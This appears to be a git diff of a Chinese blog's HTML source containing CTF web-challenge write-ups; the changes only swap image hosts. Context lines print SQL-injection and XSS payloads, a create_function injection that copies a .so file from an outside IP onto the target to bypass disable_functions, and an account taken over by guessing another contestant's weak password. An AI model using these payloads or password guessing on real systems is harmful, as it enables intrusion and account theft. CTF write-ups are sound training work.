 &lt;p>连上去就可以&lt;code>cat /flag&lt;/code>了&lt;/p>
@@ -16020,7 +16020,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>第一天还跑错文件位置了，导致自己跑了好几遍都没出来，开始怀疑自己…第二天清醒了以后，仔细看才发现原来文件位置写错了&amp;hellip;然后才跑出来&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190526233009.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190526233009.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;del>你看这个文件是得有多可气啊！你看这个黑客是有多可气啊！&lt;/del>&lt;/p>
@@ -16095,7 +16095,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;;Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;#
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190526234338.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190526234338.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="bonus">Bonus
@@ -17276,11 +17276,11 @@ loading="lazy"
 &lt;/div>&lt;p>这里预期解应该是引用，利用&lt;code>$this-&amp;gt;token_flag = &amp;amp;$this-&amp;gt;token&lt;/code>，这样来绕过&lt;/p>
 &lt;h3 id="全宇宙最简单的sql">全宇宙最简单的SQL
 &lt;/h3>&lt;p>页面会返回两种错误，一种是登录失败，一种是数据库查询失败&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004508.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004508.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们可以通过利用&lt;code>admin'&lt;/code>等操作来 fuzz 闭合方式，得到可以使用单引号闭合。但是通过万能密码可以发现一些关键字被替换了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006144.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006144.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>通过一些简单的 fuzz 可以发现有以下关键字被过滤了&lt;/p>
@@ -17468,11 +17468,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>进去看到 admin 页面，也很明显，也就是 Rogue mysql 那一套了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007327.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007327.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>DDCTF 2019 /HGAME 2019我都有写相关的 wp ，这里就不再重复了。老一套的操作，不过这里他是不能指定端口，固定访问你的 3306 ，所以你需要把自己的 vps 的 3306 端口开启才行。按照密码提示直接读就是了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009620.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009620.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>顺便拿了一波题目源码&lt;/p>
@@ -17779,7 +17779,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001017.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001017.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>本地使用&lt;code>base_convert(55490343972,10,36)()&lt;/code>成功执行&lt;code>phpinfo&lt;/code>，远程也执行了&lt;code>phpinfo&lt;/code>看看是不是有什么问题，看了一圈然而并没有发现什么问题。&lt;/p>
@@ -17876,11 +17876,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>接着队友说可以用&lt;code>rgrep ag&lt;/code>去弄，而且本地打通了&amp;hellip;但是远程以上没打通…我又修改了尝试去&lt;code>rgrep fl&lt;/code>，也没打通，当时是这样的&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009292.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009292.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>写 wp 的时候，突然又发现可以打通了&amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001335.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001335.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也是神奇&amp;hellip;最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有&lt;code>flag.php&lt;/code>，最后尝试修改&lt;code>cat f*&lt;/code>，&lt;/p>
@@ -17907,7 +17907,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>拿到 flag（复现环境下）&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001518.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001518.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
@@ -18043,7 +18043,7 @@ NULL&lt;/p>
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>很简单的变量覆盖。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009556.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009556.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-2-web-签到题">Web 2 WEB 签到题
@@ -18420,7 +18420,7 @@ NULL&lt;/p>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里循环使用&lt;code>sprintf&lt;/code>格式化打印&lt;code>$arr&lt;/code>，所以我们只需要让第二次存在一个&lt;code>%s&lt;/code>，即可让他打印出&lt;code>$this-&amp;gt;eacrykey&lt;/code>，所以可以构造&lt;code>nickname=%s&lt;/code>即可得到&lt;code>$this-&amp;gt;eacrykey&lt;/code>为 EzblrbNS&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009342.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009342.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>之后我们可以发现主要就是要构造&lt;code>$session&lt;/code>这个变量来触发&lt;code>session_read()&lt;/code>函数中的&lt;code>$session = unserialize($session);&lt;/code>&lt;/p>
@@ -18841,7 +18841,7 @@ Flag格式：&lt;code>DDCTF{.....}&lt;/code>，也就是请手动包裹上&lt;co
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们就可以利用这个特性，利用题目中的&lt;code>event_handler&lt;/code>来执行任意函数。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002577.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002577.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>利用&lt;code>#&lt;/code>成功绕过了后缀的限制执行了&lt;code>show_flag_function&lt;/code>函数。&lt;/p>
@@ -18963,7 +18963,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这个函数进入循环执行函数的条件为&lt;code>while len(request.event_queue) &amp;gt; 0&lt;/code>，而&lt;code>trigger_event&lt;/code>函数是可以控制&lt;code>request.event_queue&lt;/code>的关键，所以按照我们之前的思路，我们是不是可以利用这个函数来控制我们的执行顺序呢？&lt;/p>
 &lt;p>例如我们可以先尝试构造&lt;code>action:trigger_event%23;action:buy;8&lt;/code>，我们本地可以通过&lt;code>app.logger.info&lt;/code>来查看&lt;code>execute_event_loop&lt;/code>循环中的&lt;code>action&lt;/code>与&lt;code>args&lt;/code>参数，我们可以得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005313.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到执行了&lt;code>but_handler&lt;/code>函数，我们注意&lt;code>trigger_event&lt;/code>中是可以接受数组的&lt;/p>
@@ -18979,7 +18979,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>对于数组的处理，他会挨个加入到&lt;code>request.event_queue&lt;/code>，所以我们就可以利用传入数组来控制执行顺序，只要我们传入一个第一个参数为&lt;code>but_handler&lt;/code>的函数，第二个参数为&lt;code>get_Flag&lt;/code>的函数就可以实现在调用花费函数之前来输出 Flag 了。&lt;/p>
 &lt;p>怎么构造数组呢？在&lt;code>execute_event_loop&lt;/code>中对于参数的处理可以自己随便测试一下就知道了他是以&lt;code>:;&lt;/code>之后的字符串以&lt;code>#&lt;/code>为分割来形成数组的。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001621.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001621.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以这样子我们就成功将&lt;code>get_flag&lt;/code>函数优先调用了。接下来就是处理一些细节的事情了，比如调用&lt;code>get_Flag&lt;/code>在源代码中是&lt;code>get_flag_handler&lt;/code>，所以我们需要传入的参数是&lt;code>action:get_flag&lt;/code>，以及 Flag 最后是通过以下函数调用&lt;code>trigger_event&lt;/code>把 Flag 输出到&lt;code>session['log']&lt;/code>当中的。&lt;/p>
@@ -18998,7 +18998,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们的 payload 就是&lt;code>action:trigger_event%23;action:buy;8%23action:get_flag;&lt;/code>，再通过p牛的 flask cookie 解密脚本即可得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009428.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009428.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-5-欢迎报名ddctf">Web 5 欢迎报名DDCTF
@@ -19011,19 +19011,19 @@ loading="lazy"
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;h3 id="hacking-4">Hacking
 &lt;/h3>&lt;p>一开始根本打不了…而且还被人用 Beff 搅屎了&amp;hellip;而且严重怀疑这题是中途改题的…很坑&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008967.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008967.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先题目设置比较简单&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009535.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009535.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>测试 XSS ，但是贼坑的误导你，返回了想误导你走入 sql 注入的大坑。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004518.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004518.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以用 xss 拿到 admin.php 的 html 源码&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005558.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005558.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看到源码中一个接口，直接访问提示需要一个 id 的传参，随便输入之后看到响应包&lt;/p>
@@ -19053,23 +19053,23 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>发现&lt;code>Content-Type&lt;/code>为&lt;code>charset=gbk&lt;/code>，猜测是一个宽字节注入。而且并没有什么过滤，直接开注，可能唯一需要一点 trick 的就是需要用十六进制绕过被转义的单引号了&amp;hellip;&lt;/p>
 &lt;p>注出库名&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002153.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002153.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>注出表名&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001782.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001782.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>注出字段名&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009597.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009597.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>拿到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005221.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005221.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然也可以用 sqlmap 直接跑。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009838.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009838.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也可以指定使用&lt;code>--tamper unmagicquotes&lt;/code>来进行注入&lt;/p>
@@ -19117,16 +19117,16 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>然后看到一道类似&lt;a class="link" href="https://wulidecade.cn/index.php/archives/127/#menu_index_7" target="_blank" rel="noopener"
 >护网杯Itshop&lt;/a>题目，所以考虑这个地方是不是也是用的是余额-支出这么个操作来溢出呢&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007646.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007646.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>查找 GoLang 的相关数据类型，用 uint32 成功溢出。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007444.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007444.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>猜测在 price 转换成 int 的时候发生溢出变成 -1 ，导致余额减去花费大于0，成功绕过判断买到入场券。&lt;/p>
 &lt;p>之后就比较简单了，可以通过输入 ticket 杀 bot ，猜测 id 与 ticket 有某种映射关系，可以注册一系列小号买 ticket 保大号杀。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006639.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006639.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>附上脚本。&lt;/p>
@@ -19216,7 +19216,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这题还有一种 trick 就是猜榜单已经做出来的师傅的密码，一般 id 都是师傅们的 id ，密码大多都是12345678(别问我怎么知道…我也是12345678&amp;hellip;&lt;/p>
 &lt;p>比如这位师傅，用 12345678 登进去就拿到他的 flag 了。后面就是你敢不敢交的问题了&amp;hellip;手动斜眼，毕竟后面有一段看起来貌似是随机的字符串…可能是主办方用来防作弊的？不得而知…hhhh&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006149.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006149.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>后面看官方的 wp 发现光房预设解其实是想让选手用 md5 长度拓展攻击去做的，也可以通过下面这题 mysql 弱口令来读吃鸡的源码拿 flag。&lt;/p>
@@ -19707,11 +19707,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以读&lt;code>/etc/passwd&lt;/code>拿到 mysql 的路径，然后根据 mysql 的路径与 flag 在数据库中的位置提示，我们可以直接读&lt;code>/var/lib/mysql/security/flag.ibd&lt;/code>中可以拿到 flag，也可以读&lt;code>/var/lib/mysql/ibdata1&lt;/code>，只是这个文件一般比较大。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004554.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004554.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>也有师傅说可以读&lt;code>.mysqlhistory&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005095.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005095.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>.mysql_history&lt;/code>虽然读不到数据库内容，但是在这里可以看到这里出题者是用了&lt;code>insert&lt;/code>，我们可以看到他的操作的语句，也拿到了 flag&lt;/p>
@@ -19763,17 +19763,17 @@ NULL&lt;/p>
 &lt;h3 id="hacking">Hacking
 &lt;/h3>&lt;p>扫目录发现有&lt;code>.DS_Store&lt;/code>文件，发现&lt;code>http://ctf1.linkedbyx.com:10122/e10adc3949ba59abbe56e057f20f883e&lt;/code>目录下有 git 泄露&lt;/p>
 &lt;p>拿到文件之后有个压缩包，尝试明文攻击得到 hint.txt&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002411.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002411.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>拿到 code 为 9faedd5999937171912159d28b219d86，访问&lt;code>flag/seed.txt&lt;/code>发现回显 NAVIE&lt;/p>
 &lt;p>在首页输入 code 参数与 name 参数，回显了另一个 code&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003120.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003120.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>综合前面给出的&lt;code>flag/seed.txt&lt;/code>，猜测是个随机数的问题，应该是要猜解随机数问题，用&lt;a class="link" href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener"
 >php_mt_seed&lt;/a>这个工具直接爆破可以得到 seed&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005612.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005612.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>访问&lt;code>flag/209228.txt&lt;/code>拿到 flag&lt;/p>
@@ -19785,7 +19785,7 @@ NULL&lt;/p>
 &lt;p>{% endcolorquote %}&lt;/p>
 &lt;h3 id="hacking-1">Hacking
 &lt;/h3>&lt;p>随便用一个用户名进去。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000476.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000476.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>有一个留言功能，可以进行留言，有一个 report 功能，可以报告一个 url 给管理员，还有一个执行命令与清空留言的功能。所以很明显的一个利用思路就是留言处进行 xss ，把留言界面的 url 发送给管理员，拿到 cookie 即可进行命令执行&lt;/p>
@@ -19819,7 +19819,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后我们只需要把&lt;code>http://ctf2.linkedbyx.com:10611/main.php&lt;/code>在 report 界面提交就好了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009186.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009186.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>成功拿到 cookie ，这时候我们只需要带着 cookie 去执行命令就好了&lt;/p>
@@ -19858,7 +19858,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里我直接弹了 shell ，在根目录下发现 flag.txt&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000205.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000205.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>其实如果拿不到 cookie 的话，也可以用以下方式去构造一个 CSRF&lt;/p>
@@ -19879,7 +19879,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>事实证明也确实可以这么去做。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001833.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001833.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>waf 黑名单如下：&lt;/p>
@@ -20040,7 +20040,7 @@ flag到底在哪啊！！
 &lt;p>题目地址：&lt;a class="link" href="http://120.79.1.69:8887/web1/" target="_blank" rel="noopener"
 >http://120.79.1.69:8887/web1/&lt;/a>&lt;/p>
 &lt;h3 id="hacking">Hacking
-&lt;/h3>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002592.jpg"
+&lt;/h3>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002592.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-2-下载下载">Web 2 下载下载
@@ -20309,7 +20309,7 @@ loading="lazy"
 >http://120.79.1.69:8887/web4/&lt;/a>&lt;/p>
 &lt;h3 id="hacking-3">Hacking
 &lt;/h3>&lt;p>猜测有后门，打开 shell.php，爆一下密码为 hack&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003229.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003229.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-5-曲折的人生">Web 5 曲折的人生
@@ -20320,7 +20320,7 @@ loading="lazy"
 &lt;p>题目地址：&lt;a class="link" href="http://120.79.1.69:8887/web5/" target="_blank" rel="noopener"
 >http://120.79.1.69:8887/web5/&lt;/a>&lt;/p>
 &lt;h3 id="hacking-4">Hacking
-&lt;/h3>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006734.jpg"
+&lt;/h3>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006734.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>随便提交我们可以发现有一个错误返回&lt;/p>
@@ -20745,7 +20745,7 @@ this question is no easy
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>Code Breaking原题，只不过把 arg 的位置换了一下，无伤大雅，依旧可以用&lt;code>){return 123;}&lt;/code>这种闭合形式绕过。接下来就是突破 disable_function 的限制了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009038.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009038.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我直接用了 0ctf 的解法，因为有现成的 exp 就直接拿去用了。&lt;/p>
@@ -20757,7 +20757,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://120.79.1.69:8886/web6/?action=\create_function&amp;amp;arg=){return%202333;}copy(%22http://106.14.153.173:8080/zedd.so%22,%22/www/wwwroot/www.sec.cn/web6/zedd.so%22);%2f%2f
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006860.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006860.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>后来看了一下可以简便一点，在&lt;code>_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]&lt;/code>处发现绝对路径，然后用以下看当前文件&lt;/p>
@@ -20769,7 +20769,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">120.79&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">1.69&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8886&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">web6&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="o">=&lt;/span>\&lt;span class="n">create_function&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">202333&lt;/span>&lt;span class="p">;}&lt;/span>&lt;span class="n">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">scandir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wwwroot&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cn&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">web6&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">f&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003606.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003606.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我之前传上去的&lt;code>.so&lt;/code>，也看到了还有两个 webshell ，直接&lt;code>file_get_contents&lt;/code>读 flag 即可&lt;/p>
@@ -21038,7 +21038,7 @@ audit
 &lt;/div>
 &lt;/div>&lt;p>然而后来想想，题目应该是用的&lt;code>file_get_content()&lt;/code>函数，而不是&lt;code>include&lt;/code>的操作，即使有 php 代码，也应该无法解析。&lt;/p>
 &lt;p>然后瞎看配置文件的时候，发现 flag &amp;hellip;&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008191.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008191.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="web-2-刀塔">Web 2 刀塔
@@ -21099,7 +21099,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以看到这里用了&lt;code>system&lt;/code>，正则只允许用字母，这里我们可以直接用通配符绕过就行了。直接&lt;code>head&lt;/code>上级目录&lt;code>act=news&amp;amp;nid=../*&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg"
